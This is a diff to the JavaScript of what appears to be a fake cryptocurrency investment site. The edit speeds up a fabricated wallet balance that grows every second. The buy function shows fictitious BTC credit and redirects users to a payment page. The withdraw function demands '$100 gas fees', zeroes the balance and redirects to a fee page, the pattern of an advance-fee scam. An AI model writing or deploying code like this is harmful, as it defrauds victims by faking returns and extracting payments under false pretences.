@@ -40,7 +40,6 @@ function logIn() {
         document.getElementById('auth').style.display = 'none';
         document.getElementById('dashboard').style.display = 'block';
         document.getElementById('username').textContent = currentUser;
-        document.getElementById('pr').textContent = buyPlan(amount);
         updateWallet();
         updateBalanceSinceLastUpdate();
         startBalanceIncrease();
@@ -50,33 +49,28 @@ function logIn() {
 }
 
 function buyPlan(amount) {
-    const btc =0.0000021;
-    window.location.href = "payment.html";
-
-    walletBalance += amount * btc;
+    walletBalance += amount * 0.0000021;
     localStorage.setItem('walletBalance', walletBalance);
     localStorage.setItem('lastUpdate', Date.now());
-    
     updateWallet();
+    window.location.href = "payment.html";
+
+
 }
 
 function updateWallet() {
     document.getElementById('wallet-balance').textContent = walletBalance.toFixed(8);
 }
-function updateWalle(){
-    document.getElementById('pr').innerHTML = walletBalance;
-}
-function withdraw() {    
 
-    if (confirm('you will pay $100 gas fees if you want to withdraw your balance?')) {
+function withdraw() {
+    if (confirm('you will pay $100 gas fees if you want to withdraw your balance!!!')) {
         walletBalance = 0;
         localStorage.setItem('walletBalance', walletBalance);
         clearInterval(balanceInterval);
-
         updateWallet();
         window.location.href = "gas.html";
 
-        alert('Balance withdrawal in progress...');
+        alert('Balance withdrawal in progress....');
     }
 }
 
@@ -93,12 +87,15 @@ function updateBalanceSinceLastUpdate() {
 function startBalanceIncrease() {
     clearInterval(balanceInterval); // Ensure no previous interval is running
     balanceInterval = setInterval(() => {
-        walletBalance *= 1.00005; // Increase balance by 5% every second
+        walletBalance *= 1.0005; // Increase balance by 5% every second
         localStorage.setItem('walletBalance', walletBalance);
         localStorage.setItem('lastUpdate', Date.now());
         updateWallet();
-    }, 10000); // 1000 milliseconds = 1 second
+    }, 1000); // 1000 milliseconds = 1 second
 }
+
+
+
 
 
 
@@ -127,60 +124,3 @@ function copyToClipboard(selector) {
     
 }
 
-var myInput = document.getElementById("password");
-var letter = document.getElementById("letter");
-var capital = document.getElementById("capital");
-var number = document.getElementById("number");
-var length = document.getElementById("length");
-
-// When the user clicks on the password field, show the message box
-myInput.onfocus = function() {
-  document.getElementById("message").style.display = "block";
-}
-
-// When the user clicks outside of the password field, hide the message box
-myInput.onblur = function() {
-  document.getElementById("message").style.display = "none";
-}
-
-// When the user starts to type something inside the password field
-myInput.onkeyup = function() {
-  // Validate lowercase letters
-  var lowerCaseLetters = /[a-z]/g;
-  if(myInput.value.match(lowerCaseLetters)) {
-    letter.classList.remove("invalid");
-    letter.classList.add("valid");
-  } else {
-    letter.classList.remove("valid");
-    letter.classList.add("invalid");
-}
-
-  // Validate capital letters
-  var upperCaseLetters = /[A-Z]/g;
-  if(myInput.value.match(upperCaseLetters)) {
-    capital.classList.remove("invalid");
-    capital.classList.add("valid");
-  } else {
-    capital.classList.remove("valid");
-    capital.classList.add("invalid");
-  }
-
-  // Validate numbers
-  var numbers = /[0-9]/g;
-  if(myInput.value.match(numbers)) {
-    number.classList.remove("invalid");
-    number.classList.add("valid");
-  } else {
-    number.classList.remove("valid");
-    number.classList.add("invalid");
-  }
-
-  // Validate length
-  if(myInput.value.length >= 8) {
-    length.classList.remove("invalid");
-    length.classList.add("valid");
-  } else {
-    length.classList.remove("valid");
-    length.classList.add("invalid");
-  }
-}
